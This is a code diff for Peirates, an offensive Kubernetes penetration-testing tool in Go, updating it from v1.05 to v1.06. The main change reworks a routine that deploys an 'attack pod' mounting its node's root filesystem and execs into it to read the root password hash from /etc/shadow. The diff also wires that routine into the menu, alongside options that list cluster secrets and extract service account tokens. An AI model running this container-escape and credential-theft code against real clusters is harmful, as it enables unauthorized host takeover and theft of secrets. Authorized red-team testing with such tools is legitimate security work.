@@ -24,6 +24,7 @@ import (
 	"os" // Environment variables ...
 
 	// HTTP client/server
+	// "http"
 	"os/exec"
 	"regexp"
 	"strings"
@@ -503,39 +504,68 @@ func GetRoles(connectionString ServerInfo, kubeRoles *KubeRoles) {
 
 func MountRootFS(allPodsListme []string, connectionString ServerInfo) {
 	var MountInfoVars = MountInfo{}
-	// fmt.Println("DEBUG: grabbing image from pod: ", string(allPodsListme[3]))
-	//Get pods
-	//# Get the first pod from allPodListme
-	//podToExamine = allPodListme[0]
-
-	//# Run a kubectl command to get YAML
-	//yamlOutput = kubectl -n ...  --token .... --ca ... get pod $podToExamine -o yaml
-
-	//# Parse yaml output to get the image name
-	//imageName = `grep "- image" yamlOutput | awk '{print $3}'`
-
-	// We take the most recent deployment's image
-	// TODO: parse this via JSON
+	
+	// TODO: changing parsing to occur via JSON
 	// TODO: check that image exists / handle failure by trying again with the next youngest deployment's image or a named deployment's image
-	getImagesRaw, _, err := runKubectlSimple(connectionString, "get", "deployments", "-o", "wide", "--sort-by", "metadata.creationTimestamp")
-
-	getImageLines := strings.Split(string(getImagesRaw), "\n")
-	for _, line := range getImageLines {
-		matched, err := regexp.MatchString(`^\s*$`, line)
-		if err != nil {
-			log.Fatal(err)
-		}
-		if !matched {
-			//added checking to only enumerate running pods
-			MountInfoVars.image = strings.Fields(line)[7]
-			//fmt.Println("[+] This is the MountInfoVars.Image output: ", MountInfoVars.image)
-		}
-	}
-
+	
+	// Approach 1: Try to get the image file for my own pod
+	//./kubectl describe pod `hostname`| grep Image:
+	hostname := os.Getenv("HOSTNAME")
+	approach1_success := false
+	var image string
+	podDescriptionRaw, _, err := runKubectlSimple(connectionString, "describe", "pod",hostname)
 	if err != nil {
-		log.Fatal(err)
-	}
+		approach1_success = false
+		println("DEBUG: describe pod didn't work")
+	} else {
+		podDescriptionLines := strings.Split(string(podDescriptionRaw), "\n")
+		for _, line := range podDescriptionLines {
+			start := strings.Index(line,"Image:")
+			if start != -1 {
+				// Found an Image line -- now get the image
+				image = strings.TrimSpace(line[start + 6:])
+				println ("Found image :",image)
+				approach1_success = true
 
+				MountInfoVars.image = image
+			}
+		}
+		if ! approach1_success {
+			println("DEBUG: did not find an image line in your pod's definition.")
+		}
+	}
+	
+	if (approach1_success) {
+		println("Got image definition from own pod.")
+	} else {
+		// Approach 2 - use the most recently staged running pod
+		//
+		// TODO: re-order the list and stop the for loop as soon as we have the first running or as soon as we're able to make one of these work.
+		println("Getting image from the most recently-staged pod in thie namespace")
+		getImagesRaw, _, err := runKubectlSimple(connectionString, "get", "pods", "-o", "wide", "--sort-by", "metadata.creationTimestamp")
+		if err != nil {
+			//log.Fatal(err)
+			println("ERROR: Could not get pods")
+			return
+		}	
+		getImageLines := strings.Split(string(getImagesRaw), "\n")
+		for _, line := range getImageLines {
+			matched, err := regexp.MatchString(`^\s*$`, line)
+			if err != nil {
+				println("ERROR: could not parse pod list")
+				return
+				// log.Fatal(err)
+			}
+			if !matched {
+				//added checking to only enumerate running pods
+				// BUG: Did we do this? Check.
+				MountInfoVars.image = strings.Fields(line)[7]
+				//fmt.Println("[+] This is the MountInfoVars.Image output: ", MountInfoVars.image)
+			}
+		}
+	}
+	
+	
 	//creat random string
 	randomString := randSeq(6)
 
@@ -566,13 +596,17 @@ spec:
 
 	_, _, err = runKubectlSimple(connectionString, "apply", "-f", "attack-pod.yaml")
 	if err != nil {
-		log.Fatal(err)
+		println("Pod did not stage successfully.")
+		return
 	} else {
 		attackPodName := "attack-pod-" + randomString
-		println("[+] Executing code in " + attackPodName + " to get its underlying host's root password hash")
+		println("[+] Executing code in " + attackPodName + " to get its underlying host's root password hash - please wait for Pod to stage")
+		time.Sleep(5 * time.Second)
 		shadowFileBs, _, err := runKubectlSimple(connectionString, "exec", "-it", attackPodName, "grep", "root", "/root/etc/shadow")
 		if err != nil {
-			log.Fatal(err)
+			// BUG: when we remove that timer above and thus get an error condition, program crashes during the runKubectlSimple instead of reaching this message
+			println("Exec into that pod failed. If your privileges do permit this, the pod have need more time.  Use this main menu option to try again: Run command in one or all pods in this namespace.")
+			return
 		} else {
 			println(string(shadowFileBs))
 		}
@@ -633,7 +667,7 @@ func banner(connectionString ServerInfo) {
 ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
 ________________________________________
 
-   Peirates v1.05 by InGuardians
+   Peirates v1.06 by InGuardians
    https://www.inguardians.com/labs/
 
 ----------------------------------------------------------------`)
@@ -689,24 +723,28 @@ func PeiratesMain() {
 Recon |
 -------------------------
 [1] Enter a different service account token
-[2] Get list of pods
-[3] Get complete info on all pods (json)
-[4] Get list of secrets
-[5] Get a service account token from a secret
-[6] Get a list of roles for this service account [not yet implemented]
-[7] Get a list of abilities for a role [not yet implemented]
+[2] Change namespace setting
+[3] Get list of pods
+[4] Get complete info on all pods (json)
+[5] Get list of secrets
+[6] Get a service account token from a secret
+[7] Get a list of roles for this service account [not yet implemented]
+[8] Get a list of roles available on the cluster [implemented but not connected to menu]
+[9] Get a list of abilities for a role [not yet implemented]
 ----------------------------------------------------------------
 Vulnerabilities and Misconfiguration Searching |
 ------------------------------------------------
 [10] Check all pods for volume mounts
-[11] Launch a pod mounting its node's host filesystem [not yet implemented]
+[11] Launch a pod mounting its node's host filesystem
+[12] Request list of pods from a Kubelet [not yet implemented]
 --------
 Pivot |
 ----------------------------------------------------------------
-[11] Change namespace setting
 [12] List service accounts acquired [not yet implemented]
 [13] Switch to an acquired service account [not yet implemented]
 [20] Run command in one or all pods in this namespace 
+[13] Run a command in a pod via a Kubelet [not yet implemented]
+
 ------
 Misc |
 ----------------------------------------------------------------
@@ -722,23 +760,37 @@ Peirates:># `)
 		// Peirates MAIN MENU
 		switch input {
 
+		// exit
+		case "exit":
+			os.Exit(0)
+		
+		// [1] Enter a different service account token
 		case "1":
+
 			println("\nPlease paste in a new service account token or hit ENTER to maintain current token.")
 			var token string
 			fmt.Scanln(&token)
 			if (token != "") {
 				connectionString.Token = token
 			}
+		// [2] Change namespace setting
 		case "2":
+			println("\nEnter namespace to switch to or hit enter to maintain current namespace: ")
+			fmt.Scanln(&input)
+			if (input != "") {
+				connectionString.Namespace = input
+			}
+		// [3] Get list of pods
+		case "3":
 			println("\n[+] Printing a list of Pods in this namespace......")
 			getListOfPods(connectionString)
-		case "exit":
-			os.Exit(0)
-		case "3":
+		//[4] Get complete info on all pods (json)
+		case "4":
 			GetPodsInfo(connectionString, &podInfo)
 			break
-		case "4":
-			// Menu Item: Get List of Secrets
+		
+		//	[5] Get list of secrets
+		case "5":
 			secrets,service_account_tokens := getSecretList(connectionString) 
 			for _, secret := range secrets {
 				println("Secret found: ",secret)
@@ -747,8 +799,9 @@ Peirates:># `)
 				println("Service account found: ",svc_acct)
 			}
 			break
-		case "5":
-			// Menu Item: Get Contents of a Secret
+		
+		// [6] Get a service account token from a secret
+		case "6":
 			println("\nPlease enter the name of the secret for which you'd like the contents: ")
 			var secret_name string
 			fmt.Scanln(&secret_name)
@@ -835,13 +888,16 @@ Peirates:># `)
 				fmt.Printf("[+] Printing volume mount points for %s\n", user_response)
 				GetHostMountPointsForPod(podInfo, user_response)
 			}
+		
+		//	[11] Launch a pod mounting its node's host filesystem 
 		case "11":
-			println("\nEnter namespace to switch to or hit enter to maintain current namespace: ")
-			fmt.Scanln(&input)
-			if (input != "") {
-				connectionString.Namespace = input
-				
+			podCreation := canCreatePods(connectionString)
+			if ! podCreation {
+				println(" This token cannot create pods on the cluster")
+				break
 			}
+			MountRootFS(allPods, connectionString)
+
 		case "19":
 			break
 		case "20":
